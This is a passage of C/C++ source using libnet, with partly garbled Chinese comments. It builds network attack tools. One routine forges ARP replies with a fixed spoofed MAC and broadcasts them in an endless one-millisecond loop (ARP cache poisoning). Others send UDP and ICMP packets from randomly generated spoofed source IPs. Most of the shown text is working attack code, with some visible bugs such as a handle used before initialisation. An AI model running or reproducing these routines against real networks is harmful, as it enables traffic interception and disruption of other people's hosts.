    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0x73, 0xfa, 0x11};/* ÐéŒÙµÄÔŽMAC */

    u_int8_t dst_mac[6];/* žÉÈÅµÄÄ¿±êMAC */


    while((int)dst_mac[0]==0 && (int)dst_mac[1]==0 && (int)dst_mac[2]==0 && (int)dst_mac[3]==0 && (int)dst_mac[4]==0 && (int)dst_mac[5]==0)
    {
    arp_request((char*)dev.data(), (char*)dst_ip_s.data());
    arp_receive(dst_ip_s,(unsigned char*)dst_mac);
    }


    u_int32_t dst_ip, src_ip;                /* ÍøÂ·ÐòµÄÄ¿µÄIPºÍÔŽIP */
    char error[LIBNET_ERRBUF_SIZE];        /* ³öŽíÐÅÏ¢ */
    libnet_ptag_t arp_proto_tag, eth_proto_tag;

    /* °ÑÄ¿µÄIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* °ÑÔŽIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);

    if ( dst_ip == -1 || src_ip == -1 ) {
        printf("ip address convert error\n");
        exit(-1);
    };
    /* ³õÊŒ»¯Libnet,×¢ÒâµÚÒ»žö²ÎÊýºÍTCP³õÊŒ»¯²»Í¬ */
    if ( (handle = libnet_init(LIBNET_LINK_ADV, dev.data(), error)) == NULL ) {
        printf("libnet_init: error [%s]\n", error);
        exit(-2);
    };

    /* ¹¹ÔìarpÐ­Òé¿é */
    arp_proto_tag = libnet_build_arp(
                ARPHRD_ETHER,        /* Ó²ŒþÀàÐÍ,1±íÊŸÒÔÌ«ÍøÓ²ŒþµØÖ· */
                ETHERTYPE_IP,        /* 0x0800±íÊŸÑ¯ÎÊIPµØÖ· */
                6,                    /* Ó²ŒþµØÖ·³€¶È */
                4,                    /* IPµØÖ·³€¶È */
                ARPOP_REPLY,        /* ²Ù×÷·œÊœ:ARPÇëÇó */
                src_mac,                /* source MAC addr */
                (u_int8_t *)&src_ip,    /* src proto addr */
                dst_mac,                /* dst MAC addr */
                (u_int8_t *)&dst_ip,    /* dst IP addr */
                NULL,                /* no payload */
                0,                    /* payload length */
                handle,                /* libnet tag */
                0                    /* Create new one */
    );
    if (arp_proto_tag == -1)    {
        printf("build IP failure\n");
        exit(-3);
    };

    /* ¹¹ÔìÒ»žöÒÔÌ«ÍøÐ­Òé¿é
    You should only use this function when
    libnet is initialized with the LIBNET_LINK interface.*/
    eth_proto_tag = libnet_build_ethernet(
        dst_mac,            /* ÒÔÌ«ÍøÄ¿µÄµØÖ· */
        src_mac,            /* ÒÔÌ«ÍøÔŽµØÖ· */
        ETHERTYPE_ARP,    /* ÒÔÌ«ÍøÉÏ²ãÐ­ÒéÀàÐÍ£¬ŽËÊ±ÎªARPÇëÇó */
        NULL,            /* žºÔØ£¬ÕâÀïÎª¿Õ */
        0,                /* žºÔØŽóÐ¡ */
        handle,            /* LibnetŸä±ú */
        0                /* Ð­Òé¿é±êŒÇ£¬0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ */
    );
    if (eth_proto_tag == -1)    {
        printf("build eth_header failure\n");
        return (-4);
    };

    while(1) {
        packet_size = libnet_write(handle);        /* ËÀÑ­»··¢ËÍarpÆÛÆ­¹ã²¥ */
        usleep(1000);
    };

    libnet_destroy(handle);                /* ÊÍ·ÅŸä±ú */

    return (0);
}

int construct_UDP(string dev,string dst_ip_s,int dst_port)
{

    srand((unsigned)time(0));


    string src_ip_s = create_random_IP();

    libnet_t *handle; /* LibnetŸä±ú */
    int packet_size; /* ¹¹ÔìµÄÊýŸÝ°üŽóÐ¡ */

    char device[] = "eth0"; /* Éè±žÃû×Ö,Ò²Ö§³ÖµãÊ®œøÖÆµÄIPµØÖ·,»á×ÔŒºÕÒµœÆ¥ÅäµÄÉè±ž */
    char src_ip_str[] = "192.168.2.148"; /* ÔŽIPµØÖ·×Ö·ûŽ® */
    char dst_ip_str[] = "192.168.2.170"; /* Ä¿µÄIPµØÖ·×Ö·ûŽ® */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* ÔŽMAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* Ä¿µÄMAC */
    u_long dst_ip, src_ip; /* ÍøÂ·ÐòµÄÄ¿µÄIPºÍÔŽIP */
    char error[LIBNET_ERRBUF_SIZE]; /* ³öŽíÐÅÏ¢ */
    libnet_ptag_t eth_tag, ip_tag, udp_tag; /* ž÷²ãbuildº¯Êý·µ»ØÖµ */
    u_short proto = IPPROTO_UDP; /* Ž«Êä²ãÐ­Òé */
    u_char payload[255] = {0}; /* ³ÐÔØÊýŸÝµÄÊý×é£¬³õÖµÎª¿Õ */
    u_long payload_s = 0; /* ³ÐÔØÊýŸÝµÄ³€¶È£¬³õÖµÎª0 */

    /* °ÑÄ¿µÄIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* °ÑÔŽIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);

    /* ³õÊŒ»¯Libnet */
    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) {
        printf("libnet_init failure\n");
        return (-1);
    };

    strncpy((char*)payload, "testfwfewfwfeqwefqefqfe", sizeof(payload)-1); /* ¹¹ÔìžºÔØµÄÄÚÈÝ */
    payload_s = strlen((char*)payload); /* ŒÆËãžºÔØÄÚÈÝµÄ³€¶È */

    u_short rand_src_port = (u_short)rand()%6553;

    u_short u_dst_port = (u_short)dst_port;

    udp_tag = libnet_build_udp(
                rand_src_port, /* ÔŽ¶Ë¿Ú */
                u_dst_port, /* Ä¿µÄ¶Ë¿Ú */
                LIBNET_UDP_H + payload_s, /* ³€¶È */
                0, /* Ð£ÑéºÍ,0Îªlibnet×Ô¶¯ŒÆËã */
                payload, /* žºÔØÄÚÈÝ */
                payload_s, /* žºÔØÄÚÈÝ³€¶È */
                handle, /* libnetŸä±ú */
                0 /* ÐÂœš°ü */
    );
    if (udp_tag == -1) {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* ¹¹ÔìIPÐ­Òé¿é£¬·µ»ØÖµÊÇÐÂÉú³ÉµÄIPÐ­Òé¿ìµÄÒ»žö±êŒÇ */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_UDP_H + payload_s, /* IPÐ­Òé¿éµÄ×Ü³€,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,Ëæ»ú²úÉú0~65535 */
        0, /* frag Æ¬Æ«ÒÆ */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,Ëæ»ú²úÉú0~255 */
        proto, /* ÉÏ²ãÐ­Òé */
        0, /* Ð£ÑéºÍ£¬ŽËÊ±Îª0£¬±íÊŸÓÉLibnet×Ô¶¯ŒÆËã */
        src_ip, /* ÔŽIPµØÖ·,ÍøÂçÐò */
        dst_ip, /* Ä¿±êIPµØÖ·,ÍøÂçÐò */
        NULL, /* žºÔØÄÚÈÝ»òÎªNULL */
        0, /* žºÔØÄÚÈÝµÄŽóÐ¡*/
        handle, /* LibnetŸä±ú */
        0 /* Ð­Òé¿é±êŒÇ¿ÉÐÞžÄ»òŽŽœš,0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };

    /* ¹¹ÔìÒ»žöÒÔÌ«ÍøÐ­Òé¿é,Ö»ÄÜÓÃÓÚLIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* ÒÔÌ«ÍøÄ¿µÄµØÖ· */
        src_mac, /* ÒÔÌ«ÍøÔŽµØÖ· */
        ETHERTYPE_IP, /* ÒÔÌ«ÍøÉÏ²ãÐ­ÒéÀàÐÍ£¬ŽËÊ±ÎªIPÀàÐÍ */
        NULL, /* žºÔØ£¬ÕâÀïÎª¿Õ */
        0, /* žºÔØŽóÐ¡ */
        handle, /* LibnetŸä±ú */
        0 /* Ð­Òé¿é±êŒÇ£¬0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ */
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };

    packet_size = libnet_write(handle); /* ·¢ËÍÒÑŸ­¹¹ÔìµÄÊýŸÝ°ü*/

    libnet_destroy(handle); /* ÊÍ·ÅŸä±ú */

    return (0);
}
//#endif



void construct_icmp(string dev,string dstip){

    libnet_t *l = NULL;/* libnet句柄 */

    libnet_ptag_t protocol_tag;/* 协议标记 */
    char *payload_liu_wen_tao = NULL; /* 负载 */
    u_short payload_length = 0; /* 负载长度 */
    char device[30];/*网络设备接口*/
    for(int i=0; i<dev.length(); i++){
        device[i]=dev[i];
    }
    string src_ip_s = create_random_IP();
    u_long source_ip = 0; /* 源IP地址 */
    u_long destination_ip = 0; /* 目的IP地址 */
    char errbuf[LIBNET_ERRBUF_SIZE]; /* 错误信息 */
    int packet_length; /* 发送的数据包的长度 */
    l = libnet_init( /* 初始化libnet */
    LIBNET_RAW4, /* libnet类型，为原始套接字IPv4类型 */
    device,  /* 网络设备接口 */
    errbuf /* 错误信息 */
    );
    source_ip = libnet_name2addr4(l, (char*)src_ip_s.data() , LIBNET_RESOLVE);
    /* 把源IP地址字符串形式转化为网络字节顺序的数据 */
    destination_ip = libnet_name2addr4(l, (char*)dstip.data(), LIBNET_RESOLVE);
    /* 把目的IP地址字符串形式转化为网络字节顺序的数据 */
    protocol_tag = libnet_build_icmpv4_echo( /* 构造ICMP回显数据包 */
    ICMP_ECHO, /* 类型，此时为回显请求 */
    0,/* 代码，应该为0 */
    0, /* 校验和，为0，表示由libnet句柄自动计算 */
    123,  /* 标识符，赋值为123，自己任意填写数值 */
    456, /* 序列号，赋值为245，自己任意填写数值 */
    NULL,  /* 负载，赋值为空 */
    0, /* 负载的长度，赋值为0 */
    l, /* libnet句柄，应该是由libnet_init()函数得到的 */
    0/* 协议块标记，赋值为0，表示构造一个新的协议块 */
    );
    protocol_tag = libnet_build_ipv4(/* 构造IP协议块 */
    LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H + payload_length,/* IP协议块的长度 */
    0, /* 服务质量，这里赋值为0 */
    10,  /* 标识符，这里赋值为10 */
    0, /* 偏移，这里赋值为0 */
    20,/* 生存时间，这里赋值为20 */
    IPPROTO_ICMP,/* 上层协议类型，这里是ICMP协议 */
    0, /* 校验和，这里为0表示由libnet计算校验和 */
    source_ip, /* 源IP地址 */
    destination_ip,/* 目的IP地址 */
    (const uint8_t*)payload_liu_wen_tao, /* 负载 */
    payload_length, /* 负载的长度 */
    l,/* libnet句柄 */
    0/* 协议块标记，为0表示构造一个新的IP协议块 */
  );
//   while(1)
    packet_length=libnet_write(l);
    libnet_destroy(l);

}
